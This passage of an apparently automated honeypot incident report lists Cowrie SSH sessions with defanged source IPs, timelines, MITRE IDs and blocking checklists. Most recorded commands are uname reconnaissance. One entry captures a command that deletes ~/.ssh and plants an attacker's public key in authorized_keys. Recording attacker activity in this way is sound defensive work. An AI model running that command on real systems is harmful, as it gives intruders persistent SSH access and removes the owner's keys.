| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:09:07` | `cowrie.session.connect` |
| `2026-08-11 13:09:08` | `cowrie.client.version` |
| `2026-08-11 13:09:08` | `cowrie.client.kex` |
| `2026-08-11 13:09:09` | `cowrie.login.success` |
| `2026-08-11 13:09:10` | `cowrie.session.params` |
| `2026-08-11 13:09:10` | `cowrie.command.input` |
| `2026-08-11 13:09:10` | `cowrie.command.input` |
| `2026-08-11 13:09:10` | `cowrie.command.input` |
| `2026-08-11 13:09:10` | `cowrie.command.input` |
| `2026-08-11 13:09:10` | `cowrie.command.input` |
| `2026-08-11 13:09:10` | `cowrie.command.success` |
| `2026-08-11 13:09:10` | `cowrie.command.input` |
| `2026-08-11 13:09:10` | `cowrie.command.input` |
| `2026-08-11 13:09:10` | `cowrie.command.input` |
| `2026-08-11 13:09:10` | `cowrie.command.input` |
| `2026-08-11 13:09:11` | `cowrie.log.closed` |
| `2026-08-11 13:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7e96da2d2ff

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:09 |
| **Last Seen** | 2026-08-11 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:09:28` | `cowrie.session.connect` |
| `2026-08-11 13:09:28` | `cowrie.client.version` |
| `2026-08-11 13:09:28` | `cowrie.client.kex` |
| `2026-08-11 13:09:28` | `cowrie.login.success` |
| `2026-08-11 13:09:29` | `cowrie.session.params` |
| `2026-08-11 13:09:29` | `cowrie.command.input` |
| `2026-08-11 13:09:29` | `cowrie.log.closed` |
| `2026-08-11 13:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23226d4618e0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:10 |
| **Last Seen** | 2026-08-11 13:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:10:56` | `cowrie.session.connect` |
| `2026-08-11 13:10:56` | `cowrie.client.version` |
| `2026-08-11 13:10:56` | `cowrie.client.kex` |
| `2026-08-11 13:10:58` | `cowrie.login.success` |
| `2026-08-11 13:10:59` | `cowrie.session.params` |
| `2026-08-11 13:10:59` | `cowrie.command.input` |
| `2026-08-11 13:10:59` | `cowrie.command.input` |
| `2026-08-11 13:10:59` | `cowrie.command.input` |
| `2026-08-11 13:10:59` | `cowrie.command.input` |
| `2026-08-11 13:10:59` | `cowrie.command.input` |
| `2026-08-11 13:10:59` | `cowrie.command.success` |
| `2026-08-11 13:10:59` | `cowrie.command.input` |
| `2026-08-11 13:10:59` | `cowrie.command.input` |
| `2026-08-11 13:10:59` | `cowrie.command.input` |
| `2026-08-11 13:10:59` | `cowrie.command.input` |
| `2026-08-11 13:11:00` | `cowrie.log.closed` |
| `2026-08-11 13:11:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4db14e06d6a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:12 |
| **Last Seen** | 2026-08-11 13:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:12:46` | `cowrie.session.connect` |
| `2026-08-11 13:12:46` | `cowrie.client.version` |
| `2026-08-11 13:12:46` | `cowrie.client.kex` |
| `2026-08-11 13:12:47` | `cowrie.login.success` |
| `2026-08-11 13:12:48` | `cowrie.session.params` |
| `2026-08-11 13:12:48` | `cowrie.command.input` |
| `2026-08-11 13:12:48` | `cowrie.command.input` |
| `2026-08-11 13:12:48` | `cowrie.command.input` |
| `2026-08-11 13:12:48` | `cowrie.command.input` |
| `2026-08-11 13:12:48` | `cowrie.command.input` |
| `2026-08-11 13:12:48` | `cowrie.command.success` |
| `2026-08-11 13:12:48` | `cowrie.command.input` |
| `2026-08-11 13:12:48` | `cowrie.command.input` |
| `2026-08-11 13:12:48` | `cowrie.command.input` |
| `2026-08-11 13:12:48` | `cowrie.command.input` |
| `2026-08-11 13:12:49` | `cowrie.log.closed` |
| `2026-08-11 13:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d988d174a3c4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:14 |
| **Last Seen** | 2026-08-11 13:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:14:39` | `cowrie.session.connect` |
| `2026-08-11 13:14:39` | `cowrie.client.version` |
| `2026-08-11 13:14:39` | `cowrie.client.kex` |
| `2026-08-11 13:14:40` | `cowrie.login.success` |
| `2026-08-11 13:14:41` | `cowrie.session.params` |
| `2026-08-11 13:14:41` | `cowrie.command.input` |
| `2026-08-11 13:14:41` | `cowrie.command.input` |
| `2026-08-11 13:14:41` | `cowrie.command.input` |
| `2026-08-11 13:14:41` | `cowrie.command.input` |
| `2026-08-11 13:14:41` | `cowrie.command.input` |
| `2026-08-11 13:14:41` | `cowrie.command.success` |
| `2026-08-11 13:14:41` | `cowrie.command.input` |
| `2026-08-11 13:14:41` | `cowrie.command.input` |
| `2026-08-11 13:14:41` | `cowrie.command.input` |
| `2026-08-11 13:14:41` | `cowrie.command.input` |
| `2026-08-11 13:14:42` | `cowrie.log.closed` |
| `2026-08-11 13:14:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d66c5490d52b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:14 |
| **Last Seen** | 2026-08-11 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:14:52` | `cowrie.session.connect` |
| `2026-08-11 13:14:52` | `cowrie.client.version` |
| `2026-08-11 13:14:52` | `cowrie.client.kex` |
| `2026-08-11 13:14:52` | `cowrie.login.success` |
| `2026-08-11 13:14:53` | `cowrie.session.params` |
| `2026-08-11 13:14:53` | `cowrie.command.input` |
| `2026-08-11 13:14:53` | `cowrie.log.closed` |
| `2026-08-11 13:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81237bfab3cb

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-08-11 13:15 |
| **Last Seen** | 2026-08-11 13:19 |
| **Session Duration** | 253s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:15:45` | `cowrie.session.connect` |
| `2026-08-11 13:15:45` | `cowrie.client.version` |
| `2026-08-11 13:15:45` | `cowrie.client.kex` |
| `2026-08-11 13:15:46` | `cowrie.login.success` |
| `2026-08-11 13:15:48` | `cowrie.session.params` |
| `2026-08-11 13:15:48` | `cowrie.command.input` |
| `2026-08-11 13:15:48` | `cowrie.command.failed` |
| `2026-08-11 13:15:48` | `cowrie.log.closed` |
| `2026-08-11 13:15:49` | `cowrie.session.params` |
| `2026-08-11 13:15:49` | `cowrie.command.input` |
| `2026-08-11 13:19:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-178757c8e5ad

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:16 |
| **Last Seen** | 2026-08-11 13:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:16:31` | `cowrie.session.connect` |
| `2026-08-11 13:16:31` | `cowrie.client.version` |
| `2026-08-11 13:16:31` | `cowrie.client.kex` |
| `2026-08-11 13:16:32` | `cowrie.login.success` |
| `2026-08-11 13:16:33` | `cowrie.session.params` |
| `2026-08-11 13:16:33` | `cowrie.command.input` |
| `2026-08-11 13:16:33` | `cowrie.command.input` |
| `2026-08-11 13:16:33` | `cowrie.command.input` |
| `2026-08-11 13:16:33` | `cowrie.command.input` |
| `2026-08-11 13:16:33` | `cowrie.command.input` |
| `2026-08-11 13:16:33` | `cowrie.command.success` |
| `2026-08-11 13:16:33` | `cowrie.command.input` |
| `2026-08-11 13:16:33` | `cowrie.command.input` |
| `2026-08-11 13:16:33` | `cowrie.command.input` |
| `2026-08-11 13:16:33` | `cowrie.command.input` |
| `2026-08-11 13:16:33` | `cowrie.log.closed` |
| `2026-08-11 13:16:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c9e8f7d0164

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:17 |
| **Last Seen** | 2026-08-11 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:17:35` | `cowrie.session.connect` |
| `2026-08-11 13:17:35` | `cowrie.client.version` |
| `2026-08-11 13:17:35` | `cowrie.client.kex` |
| `2026-08-11 13:17:36` | `cowrie.login.success` |
| `2026-08-11 13:17:37` | `cowrie.session.params` |
| `2026-08-11 13:17:37` | `cowrie.command.input` |
| `2026-08-11 13:17:37` | `cowrie.log.closed` |
| `2026-08-11 13:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59bfea8b27d5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:18 |
| **Last Seen** | 2026-08-11 13:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:18:25` | `cowrie.session.connect` |
| `2026-08-11 13:18:25` | `cowrie.client.version` |
| `2026-08-11 13:18:25` | `cowrie.client.kex` |
| `2026-08-11 13:18:26` | `cowrie.login.success` |
| `2026-08-11 13:18:27` | `cowrie.session.params` |
| `2026-08-11 13:18:27` | `cowrie.command.input` |
| `2026-08-11 13:18:27` | `cowrie.command.input` |
| `2026-08-11 13:18:27` | `cowrie.command.input` |
| `2026-08-11 13:18:27` | `cowrie.command.input` |
| `2026-08-11 13:18:27` | `cowrie.command.input` |
| `2026-08-11 13:18:27` | `cowrie.command.success` |
| `2026-08-11 13:18:27` | `cowrie.command.input` |
| `2026-08-11 13:18:27` | `cowrie.command.input` |
| `2026-08-11 13:18:27` | `cowrie.command.input` |
| `2026-08-11 13:18:27` | `cowrie.command.input` |
| `2026-08-11 13:18:27` | `cowrie.log.closed` |
| `2026-08-11 13:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7dad93a30db

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:20 |
| **Last Seen** | 2026-08-11 13:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:20:20` | `cowrie.session.connect` |
| `2026-08-11 13:20:20` | `cowrie.client.version` |
| `2026-08-11 13:20:20` | `cowrie.client.kex` |
| `2026-08-11 13:20:21` | `cowrie.login.success` |
| `2026-08-11 13:20:22` | `cowrie.session.params` |
| `2026-08-11 13:20:22` | `cowrie.command.input` |
| `2026-08-11 13:20:22` | `cowrie.log.closed` |
| `2026-08-11 13:20:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc5e833ebd3e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:20 |
| **Last Seen** | 2026-08-11 13:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:20:25` | `cowrie.session.connect` |
| `2026-08-11 13:20:25` | `cowrie.client.version` |
| `2026-08-11 13:20:25` | `cowrie.client.kex` |
| `2026-08-11 13:20:26` | `cowrie.login.success` |
| `2026-08-11 13:20:27` | `cowrie.session.params` |
| `2026-08-11 13:20:27` | `cowrie.command.input` |
| `2026-08-11 13:20:27` | `cowrie.command.input` |
| `2026-08-11 13:20:27` | `cowrie.command.input` |
| `2026-08-11 13:20:27` | `cowrie.command.input` |
| `2026-08-11 13:20:27` | `cowrie.command.input` |
| `2026-08-11 13:20:27` | `cowrie.command.success` |
| `2026-08-11 13:20:27` | `cowrie.command.input` |
| `2026-08-11 13:20:27` | `cowrie.command.input` |
| `2026-08-11 13:20:27` | `cowrie.command.input` |
| `2026-08-11 13:20:27` | `cowrie.command.input` |
| `2026-08-11 13:20:29` | `cowrie.log.closed` |
| `2026-08-11 13:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42067b54686f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:22 |
| **Last Seen** | 2026-08-11 13:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:22:23` | `cowrie.session.connect` |
| `2026-08-11 13:22:23` | `cowrie.client.version` |
| `2026-08-11 13:22:23` | `cowrie.client.kex` |
| `2026-08-11 13:22:24` | `cowrie.login.success` |
| `2026-08-11 13:22:25` | `cowrie.session.params` |
| `2026-08-11 13:22:25` | `cowrie.command.input` |
| `2026-08-11 13:22:25` | `cowrie.command.input` |
| `2026-08-11 13:22:25` | `cowrie.command.input` |
| `2026-08-11 13:22:25` | `cowrie.command.input` |
| `2026-08-11 13:22:25` | `cowrie.command.input` |
| `2026-08-11 13:22:25` | `cowrie.command.success` |
| `2026-08-11 13:22:25` | `cowrie.command.input` |
| `2026-08-11 13:22:25` | `cowrie.command.input` |
| `2026-08-11 13:22:25` | `cowrie.command.input` |
| `2026-08-11 13:22:25` | `cowrie.command.input` |
| `2026-08-11 13:22:25` | `cowrie.log.closed` |
| `2026-08-11 13:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ef889205a8b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:23 |
| **Last Seen** | 2026-08-11 13:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:23:06` | `cowrie.session.connect` |
| `2026-08-11 13:23:06` | `cowrie.client.version` |
| `2026-08-11 13:23:06` | `cowrie.client.kex` |
| `2026-08-11 13:23:06` | `cowrie.login.success` |
| `2026-08-11 13:23:07` | `cowrie.session.params` |
| `2026-08-11 13:23:07` | `cowrie.command.input` |
| `2026-08-11 13:23:07` | `cowrie.log.closed` |
| `2026-08-11 13:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a84836f7f0ae

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:23 |
| **Last Seen** | 2026-08-11 13:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:23:42` | `cowrie.session.connect` |
| `2026-08-11 13:23:42` | `cowrie.client.version` |
| `2026-08-11 13:23:42` | `cowrie.client.kex` |
| `2026-08-11 13:23:43` | `cowrie.login.success` |
| `2026-08-11 13:23:43` | `cowrie.session.params` |
| `2026-08-11 13:23:43` | `cowrie.command.input` |
| `2026-08-11 13:23:44` | `cowrie.log.closed` |
| `2026-08-11 13:23:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66540b2d747f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:24 |
| **Last Seen** | 2026-08-11 13:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
